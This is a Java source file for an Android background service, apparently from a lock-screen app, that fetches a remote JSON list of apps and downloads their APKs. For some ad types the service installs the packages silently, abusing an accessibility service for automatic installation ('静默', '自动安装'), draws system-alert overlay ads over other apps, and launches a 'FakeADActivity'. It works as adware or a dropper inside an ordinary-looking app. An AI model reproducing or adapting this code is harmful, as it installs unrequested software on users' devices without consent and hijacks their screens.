package com.lockstudio.sticklocker.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;

import com.lockstudio.sticklocker.activity.FakeADActivity;
import com.lockstudio.sticklocker.application.LockApplication;
import com.lockstudio.sticklocker.util.CustomEventCommit;
import com.lockstudio.sticklocker.util.DensityUtil;
import com.lockstudio.sticklocker.util.DeviceInfoUtils;
import com.lockstudio.sticklocker.util.DrawableUtils;
import com.lockstudio.sticklocker.util.RLog;
import com.tommy.ad.ADownloadManager;
import com.tommy.ad.JsonRequest;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;

import cn.opda.android.activity.R;

public class DPService extends Service implements ADownloadManager.Listener {

    public static final String TAG = "V5_ADService";
    private static final String TAG2 = "V5_DPService";

    private JsonRequest jsonRequest;

    private boolean isRunning = false;

    HashMap<String, ADownloadManager> aDownloadManagerHashMap = new HashMap<String, ADownloadManager>();

    @Override
    public void onCreate() {
        super.onCreate();
        jsonRequest = new JsonRequest();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public boolean onUnbind(Intent intent) {
        aDownloadManagerHashMap.clear();
        return super.onUnbind(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (isRunning) {
            return super.onStartCommand(intent, flags, startId);
        }
        isRunning = true;

        CustomEventCommit.commit(DPService.this, TAG2, "DPService:onStartCommand");

        if (intent != null) {
            String url = getRequestUrl(intent.getStringExtra("url"));
            RLog.d("url", url + "");

            jsonRequest.start(url, new JsonRequest.Listener() {
                @Override
                public void onResponse(JSONObject response) {
                    isRunning = false;
                    CustomEventCommit.commit(DPService.this, TAG2, "JsonResponse");
                    parseJson(response);
                }

                @Override
                public void onErrorResponse(int errCode) {
                    isRunning = false;
                    CustomEventCommit.commit(DPService.this, TAG2, "JsonErrorResponse:" + errCode);
                }
            });
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        aDownloadManagerHashMap.clear();
        if (rootView != null && rootView.isShown()) {
            if (windowManager == null) {
                windowManager = (WindowManager) DPService.this.getSystemService(Context.WINDOW_SERVICE);
            }
            windowManager.removeView(rootView);
            rootView = null;
        }
    }


    private View rootView = null;
    private WindowManager windowManager = null;

    private void parseJson(JSONObject response) {
        if (response != null && response.optInt("code") == 200) {
            JSONArray jsonArray = response.optJSONArray("json");
            if (jsonArray == null || jsonArray.length() == 0) {
                return;
            }

            JSONObject jsonObject = null;
            String pn = "";
            String title = "";

            boolean b = false;
            for (int i = 0; i < jsonArray.length(); i++) {
                jsonObject = jsonArray.optJSONObject(i);
                if (jsonObject != null) {

                    pn = jsonObject.optString("pn");
                    title = jsonObject.optString("title");

                    // 判断是否安装,已安装就跳过.
                    try {
                        getPackageManager().getPackageInfo(pn, 0);
                        CustomEventCommit.commit(DPService.this, TAG, title + "[已存在]");
                    } catch (NameNotFoundException e) {
//                        e.printStackTrace();
                        b = true;
                        break;
                    }
                }
            }

            if (!b || jsonObject == null) {
                return;
            }


            String apkUrl = jsonObject.optString("apk");
            String md5 = jsonObject.optString("md5");
            String iconUrl = jsonObject.optString("icon");
            String content = jsonObject.optString("content");
            int type = jsonObject.optInt("type");

            CustomEventCommit.commit(DPService.this, TAG2, "AD:TYPE:" + type);

            if (aDownloadManagerHashMap.containsKey(title)) {
                ADownloadManager aDownloadManager = aDownloadManagerHashMap.get(title);
                aDownloadManager.startDownloadAD();

                return;
            }

            ADownloadManager aDownloadManager = new ADownloadManager(this);
            aDownloadManager.setPackageName(pn);
            aDownloadManager.setApkUrl(apkUrl);
            aDownloadManager.setIconUrl(iconUrl);
            aDownloadManager.setContent(content);
            aDownloadManager.setType(type);
            aDownloadManager.setMd5(md5);
            aDownloadManager.setTitle(title);
            aDownloadManager.setListener(this);

            aDownloadManagerHashMap.put(aDownloadManager.getTitle(), aDownloadManager);
            aDownloadManager.startDownloadAD();
        }
    }


    private static final int MSG_SHOW_AD = 100;
    private Handler handler = new Handler(new Handler.Callback() {
        @Override
        public boolean handleMessage(Message msg) {
            if (msg.what == MSG_SHOW_AD) {
                if (msg.obj instanceof ADownloadManager) {
                    ADownloadManager aDownloadManager = (ADownloadManager) msg.obj;
                    try {
                        showAd(aDownloadManager);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            return false;
        }
    });

    private void showAd(ADownloadManager aDownloadManager) {
        RLog.d("showAD", "type=" +aDownloadManager.getType());

        if (aDownloadManager.getType() == 1) {
            //通知
        } else if (aDownloadManager.getType() == 2) {
            //弹出对话框
        } else if (aDownloadManager.getType() == 3) {
            //图片插屏
            if (new File(aDownloadManager.getApkFullName()).exists()) {
                RLog.d("apk", "存在");
                LockApplication.getInstance().getConfig().setPush2000Url("");
                if (new File(aDownloadManager.getIconFullName()).exists()) {
                    RLog.d("icon", "存在");
                    cuttingAd(aDownloadManager);
                } else {
                    startInstall(aDownloadManager);
                }
            }
        } else if (aDownloadManager.getType() == 4) {
            //静默
            if (new File(aDownloadManager.getApkFullName()).exists()) {
                LockApplication.getInstance().getConfig().setPush2000Url("");
                startInstall(aDownloadManager);
            }
        }
    }

    protected void showPushDialog(final String iconUrl, final String filePath, final String appName) {
        // String imagePath = downloadImage(iconUrl);
        // if (imagePath != null && new File(imagePath).exists()) {
        // Intent intent = new Intent(getApplicationContext(),
        // DialogPushActivity.class);
        // intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        // intent.putExtra("imagePath", imagePath);
        // intent.putExtra("apkPath", filePath);
        // intent.putExtra("title", appName);
        // intent.putExtra("pn", pn);
        // startActivity(intent);
        // }
    }

    private void cuttingAd(final ADownloadManager aDownloadManager) {
        if (rootView != null && rootView.isShown()) {
            if (windowManager == null) {
                windowManager = (WindowManager) DPService.this.getSystemService(Context.WINDOW_SERVICE);
            }
            try {
                windowManager.removeViewImmediate(rootView);
                rootView = null;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        Bitmap bitmap = BitmapFactory.decodeFile(aDownloadManager.getIconFullName());
        int w = DeviceInfoUtils.getDeviceWidth(this);
        int h = DeviceInfoUtils.getDeviceHeight(this);
        float bitmapWidth = w - DensityUtil.dip2px(DPService.this, 100);

        float scale = bitmapWidth * 1.0f / bitmap.getWidth();
        bitmap = DrawableUtils.scaleTo(bitmap, scale, scale);

        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
        layoutParams.width = bitmap.getWidth();
        layoutParams.height = bitmap.getHeight();
        layoutParams.x = (w - bitmap.getWidth()) / 2;
        layoutParams.y = (h - bitmap.getHeight()) / 2;

        layoutParams.gravity = Gravity.TOP | Gravity.LEFT;

        layoutParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        layoutParams.alpha = 1.0f;

        layoutParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE; // 不能抢占聚焦点
        layoutParams.flags |= WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
        layoutParams.flags |= WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS; // 排版不受限制

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            layoutParams.flags |= WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS;
            layoutParams.flags |= WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION;
        }

        layoutParams.format = PixelFormat.TRANSPARENT;
        layoutParams.screenOrientation = Configuration.ORIENTATION_PORTRAIT;

        LayoutInflater inflater = LayoutInflater.from(this);
        rootView = inflater.inflate(R.layout.window_dp, null);
        ImageView imageView = (ImageView) rootView.findViewById(R.id.window_dp_image_view);
        imageView.setImageBitmap(bitmap);
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                CustomEventCommit.commit(DPService.this, TAG, aDownloadManager.getTitle() + "[广告点击]");

                if (rootView != null && rootView.isShown()) {
                    if (windowManager == null) {
                        windowManager = (WindowManager) DPService.this.getSystemService(Context.WINDOW_SERVICE);
                    }
                    try {
                        windowManager.removeViewImmediate(rootView);
                        rootView = null;
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                startInstall(aDownloadManager);
            }
        });

        if (windowManager == null) {
            windowManager = (WindowManager) DPService.this.getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        }
        windowManager.addView(rootView, layoutParams);
        CustomEventCommit.commit(DPService.this, TAG, aDownloadManager.getTitle() + "[广告展示]");

        try {
            Intent i = new Intent(this, FakeADActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("title", aDownloadManager.getTitle());
            startActivity(i);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startInstall(final ADownloadManager aDownloadManager) {
        File file = new File(aDownloadManager.getApkFullName());
        if (file.exists()) {

            CustomEventCommit.commit(DPService.this, TAG, aDownloadManager.getTitle() + "[广告弹出安装]");

            if (SystemNotificationService.isAccessibilitySettingsOn(DPService.this)) {
                Intent it = new Intent(DPService.this, SystemNotificationService.class);
                it.putExtra("TYPE", SystemNotificationService.TYPE_INSTALL_APP_OPEN);
                it.putExtra("APK", aDownloadManager.getApkFullName());
                it.putExtra("PN", aDownloadManager.getPackageName());
                it.putExtra("TITLE", aDownloadManager.getTitle());
                startService(it);
                CustomEventCommit.commit(DPService.this, TAG2, aDownloadManager.getTitle() + "[自动安装]");
            } else {
                Intent intent = new Intent();
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.setAction(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
                try {
                    DPService.this.getApplicationContext().startActivity(intent);
                    CustomEventCommit.commit(DPService.this, TAG2, aDownloadManager.getTitle() + "[手动安装]");
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }


        }
    }

    private String getRequestUrl(String url) {
        JSONObject jsonObject = new JSONObject();
        try {
            String umengChannel = "";
            try {
                ApplicationInfo appInfo = getPackageManager().getApplicationInfo(getPackageName(), PackageManager.GET_META_DATA);
                umengChannel = appInfo.metaData.getString("UMENG_CHANNEL");
            } catch (NameNotFoundException e) {
                e.printStackTrace();
            }

            int versionCode = 0;
            try {
                PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
                versionCode = packageInfo.versionCode;
            } catch (NameNotFoundException e) {
                e.printStackTrace();
            }
            // jsonObject.put("pn", "com.opda.android.activity");
            jsonObject.put("pn", getPackageName());
            // jsonObject.put("channel", umengChannel);
            // jsonObject.put("ver", versionCode);
            // jsonObject.put("time", System.currentTimeMillis());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return url + "?json=" + jsonObject.toString();
//		return url + "?json=" + URLEncoder.encode(jsonObject.toString());
    }


    @Override
    public void onResponse(ADownloadManager aDownloadManager) {
        Message msg = handler.obtainMessage();
        msg.what = MSG_SHOW_AD;
        msg.obj = aDownloadManager;
        handler.sendMessage(msg);

        if (aDownloadManagerHashMap.containsKey(aDownloadManager.getTitle())) {
            aDownloadManagerHashMap.remove(aDownloadManager.getTitle());
        }
    }

    @Override
    public void onErrorResponse(ADownloadManager aDownloadManager, int code) {
        if (aDownloadManagerHashMap.containsKey(aDownloadManager.getTitle())) {
            aDownloadManagerHashMap.remove(aDownloadManager.getTitle());
        }
    }
}
